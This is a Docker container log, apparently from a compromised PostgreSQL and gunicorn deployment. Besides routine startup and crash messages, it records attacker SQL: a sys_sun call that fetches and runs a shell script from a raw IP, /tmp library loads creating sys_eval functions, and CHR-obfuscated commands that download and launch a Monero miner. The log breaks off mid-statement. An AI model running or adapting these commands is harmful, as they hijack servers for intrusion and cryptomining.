-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
-[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
-[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
-[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
-[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-22 17:07:37 UTC
-[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
-[32mpostgres_1  |[0m LOG:  invalid record length at 0/17599E0: wanted 24, got 0
-[32mpostgres_1  |[0m LOG:  redo is not required
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m sh: 1: wget: not found
-[32mpostgres_1  |[0m LOG:  server process (PID 28) exited with exit code 127
-[32mpostgres_1  |[0m LOG:  terminating any other active server processes
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
-[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-23 08:37:37 UTC
-[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
-[32mpostgres_1  |[0m LOG:  invalid record length at 0/1759A50: wanted 24, got 0
-[32mpostgres_1  |[0m LOG:  redo is not required
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [1] [INFO] Starting gunicorn 19.3.0
-[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1)
-[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [1] [INFO] Using worker: sync
-[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [8] [INFO] Booting worker with pid: 8
-[33mweb_1       |[0m [2017-04-23 08:37:37 +0000] [10] [INFO] Booting worker with pid: 10
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-24 09:16:12 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:10)
-[33mweb_1       |[0m [2017-04-24 11:16:12 +0000] [10] [INFO] Worker exiting (pid: 10)
-[33mweb_1       |[0m [2017-04-24 09:16:13 +0000] [22] [INFO] Booting worker with pid: 22
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-24 09:17:03 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:22)
-[33mweb_1       |[0m [2017-04-24 11:17:03 +0000] [22] [INFO] Worker exiting (pid: 22)
-[33mweb_1       |[0m [2017-04-24 09:17:04 +0000] [32] [INFO] Booting worker with pid: 32
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-24 09:36:11 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:32)
-[33mweb_1       |[0m [2017-04-24 11:36:11 +0000] [32] [INFO] Worker exiting (pid: 32)
-[33mweb_1       |[0m [2017-04-24 09:36:11 +0000] [42] [INFO] Booting worker with pid: 42
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-24 14:37:46 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:42)
-[33mweb_1       |[0m [2017-04-24 16:37:46 +0000] [42] [INFO] Worker exiting (pid: 42)
-[33mweb_1       |[0m [2017-04-24 14:37:46 +0000] [52] [INFO] Booting worker with pid: 52
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-24 19:03:48 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:8)
-[33mweb_1       |[0m [2017-04-24 21:03:48 +0000] [8] [INFO] Worker exiting (pid: 8)
-[33mweb_1       |[0m [2017-04-24 19:03:49 +0000] [62] [INFO] Booting worker with pid: 62
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-24 19:04:48 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:62)
-[33mweb_1       |[0m [2017-04-24 21:04:48 +0000] [62] [INFO] Worker exiting (pid: 62)
-[33mweb_1       |[0m [2017-04-24 19:04:49 +0000] [72] [INFO] Booting worker with pid: 72
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-24 19:10:43 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:52)
-[33mweb_1       |[0m [2017-04-24 21:10:43 +0000] [52] [INFO] Worker exiting (pid: 52)
-[33mweb_1       |[0m [2017-04-24 19:10:44 +0000] [82] [INFO] Booting worker with pid: 82
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-24 19:14:16 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:72)
-[33mweb_1       |[0m [2017-04-24 21:14:16 +0000] [72] [INFO] Worker exiting (pid: 72)
-[33mweb_1       |[0m [2017-04-24 19:14:17 +0000] [92] [INFO] Booting worker with pid: 92
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-25 09:33:26 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:92)
-[33mweb_1       |[0m [2017-04-25 11:33:26 +0000] [92] [INFO] Worker exiting (pid: 92)
-[33mweb_1       |[0m Exception in thread Thread-1 (most likely raised during interpreter shutdown):
-[33mweb_1       |[0m Traceback (most recent call last):
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/threading.py", line 801, in __bootstrap_inner
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/gunicorn/reloader.py", line 41, in run
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/gunicorn/reloader.py", line 29, in get_files
-[33mweb_1       |[0m <type 'exceptions.AttributeError'>: 'NoneType' object has no attribute 'modules'
-[33mweb_1       |[0m [2017-04-25 09:33:27 +0000] [102] [INFO] Booting worker with pid: 102
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-25 09:36:47 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:82)
-[33mweb_1       |[0m [2017-04-25 11:36:47 +0000] [82] [INFO] Worker exiting (pid: 82)
-[33mweb_1       |[0m Exception in thread Thread-1 (most likely raised during interpreter shutdown):
-[33mweb_1       |[0m Traceback (most recent call last):
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/threading.py", line 801, in __bootstrap_inner
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/gunicorn/reloader.py", line 41, in run
-[33mweb_1       |[0m   File "/usr/local/lib/python2.7/site-packages/gunicorn/reloader.py", line 29, in get_files
-[33mweb_1       |[0m <type 'exceptions.AttributeError'>: 'NoneType' object has no attribute 'modules'
-[33mweb_1       |[0m [2017-04-25 09:36:48 +0000] [112] [INFO] Booting worker with pid: 112
-[33mweb_1       |[0m [2017-04-25 11:38:34 +0000] [102] [INFO] Worker reloading: /code/toolapp/settings.py modified
-[33mweb_1       |[0m [2017-04-25 11:38:34 +0000] [112] [INFO] Worker reloading: /code/toolapp/settings.py modified
-[33mweb_1       |[0m [2017-04-25 11:38:34 +0000] [102] [INFO] Worker exiting (pid: 102)
-[33mweb_1       |[0m [2017-04-25 11:38:34 +0000] [112] [INFO] Worker exiting (pid: 112)
-[33mweb_1       |[0m [2017-04-25 09:38:34 +0000] [115] [INFO] Booting worker with pid: 115
-[33mweb_1       |[0m [2017-04-25 09:38:34 +0000] [118] [INFO] Booting worker with pid: 118
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-25 09:39:12 +0000] [1] [CRITICAL] WORKER TIMEOUT (pid:118)
-[33mweb_1       |[0m [2017-04-25 11:39:12 +0000] [118] [INFO] Worker exiting (pid: 118)
-[33mweb_1       |[0m [2017-04-25 09:39:13 +0000] [128] [INFO] Booting worker with pid: 128
-[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://45.79.102.120/pgpool.sh -O /tmp/pgpool.sh;curl http://45.79.102.120/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
-[32mpostgres_1  |[0m sh: 1: wget: not found
-[32mpostgres_1  |[0m LOG:  server process (PID 274) exited with exit code 127
-[32mpostgres_1  |[0m LOG:  terminating any other active server processes
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
-[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-23 08:58:50 UTC
-[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
-[32mpostgres_1  |[0m LOG:  redo starts at 0/1759AC0
-[32mpostgres_1  |[0m LOG:  invalid magic number 0000 in log segment 000000010000000000000001, offset 7757824
-[32mpostgres_1  |[0m LOG:  redo done at 0/1763B18
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  unexpected EOF on client connection with an open transaction
-[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://45.79.102.120/pgpool.sh -O /tmp/pgpool.sh;curl http://45.79.102.120/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
-[32mpostgres_1  |[0m sh: 1: wget: not found
-[32mpostgres_1  |[0m LOG:  server process (PID 3598) exited with exit code 127
-[32mpostgres_1  |[0m LOG:  terminating any other active server processes
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
-[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-24 19:04:50 UTC
-[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
-[32mpostgres_1  |[0m LOG:  redo starts at 0/176EB80
-[32mpostgres_1  |[0m LOG:  invalid magic number 0000 in log segment 000000010000000000000001, offset 7847936
-[32mpostgres_1  |[0m LOG:  redo done at 0/1779520
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m ERROR:  table "akeupr" does not exist
-[32mpostgres_1  |[0m STATEMENT:  DROP TABLE akeupr
-[32mpostgres_1  |[0m ERROR:  large object 6566 does not exist
-[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(6566)
-[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libsnoiftc.so": version mismatch
-[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
-[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION apach2(text) RETURNS int4 AS '/tmp/libsnoiftc.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
-[32mpostgres_1  |[0m ERROR:  function apach2(text) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  SELECT apach2((CHR(112)||CHR(115)||CHR(32)||CHR(45)||CHR(101)||CHR(102)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(45)||CHR(118)||CHR(32)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(124)||CHR(99)||CHR(117)||CHR(116)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(57)||CHR(45)||CHR(49)||CHR(53)||CHR(124)||CHR(120)||CHR(97)||CHR(114)||CHR(103)||CHR(115)||CHR(32)||CHR(107)||CHR(105)||CHR(108)||CHR(108)||CHR(32)||CHR(45)||CHR(57)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(56)||CHR(54)||CHR(46)||CHR(54)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(111)||CHR(105)||CHR(111)||CHR(119)||CHR(107)||CHR(115)||CHR(98)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(111)||CHR(105)||CHR(111)||CHR(119)||CHR(107)||CHR(115)||CHR(98)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(111)||CHR(105)||CHR(111)||CHR(119)||CHR(107)||CHR(115)||CHR(98)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(62)||CHR(47)||CHR(100)||CHR(101)||CHR(118)||CHR(47)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(32)||CHR(38)))
-[32mpostgres_1  |[0m ERROR:  table "klwriz" does not exist
-[32mpostgres_1  |[0m STATEMENT:  DROP TABLE klwriz
-[32mpostgres_1  |[0m ERROR:  large object 3552 does not exist
-[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(3552)
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m ERROR:  table "ljjyog" does not exist
-[32mpostgres_1  |[0m STATEMENT:  DROP TABLE ljjyog
-[32mpostgres_1  |[0m ERROR:  large object 4584 does not exist
-[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(4584)
-[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libspixwxt.so": version mismatch
-[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
-[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION systemlogin(text) RETURNS int4 AS '/tmp/libspixwxt.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
-[32mpostgres_1  |[0m ERROR:  function systemlogin(text) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  SELECT systemlogin((CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(52)||CHR(56)||CHR(46)||CHR(54)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(102)||CHR(101)||CHR(118)||CHR(103)||CHR(122)||CHR(113)||CHR(97)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(102)||CHR(101)||CHR(118)||CHR(103)||CHR(122)||CHR(113)||CHR(97)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(102)||CHR(101)||CHR(118)||CHR(103)||CHR(122)||CHR(113)||CHR(97)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(62)||CHR(47)||CHR(100)||CHR(101)||CHR(118)||CHR(47)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(32)||CHR(38)))
-[32mpostgres_1  |[0m ERROR:  table "xjippc" does not exist
-[32mpostgres_1  |[0m STATEMENT:  DROP TABLE xjippc
-[32mpostgres_1  |[0m ERROR:  large object 6779 does not exist
-[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(6779)
-[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libswrrdop.so": version mismatch
-[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
-[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION systemlogin(text) RETURNS int4 AS '/tmp/libswrrdop.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
-[32mpostgres_1  |[0m ERROR:  function systemlogin(text) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  SELECT systemlogin((CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(52)||CHR(56)||CHR(46)||CHR(54)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(110)||CHR(105)||CHR(122)||CHR(99)||CHR(97)||CHR(97)||CHR(107)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(110)||CHR(105)||CHR(122)||CHR(99)||CHR(97)||CHR(97)||CHR(107)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(110)||CHR(105)||CHR(122)||CHR(99)||CHR(97)||CHR(97)||CHR(107)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||C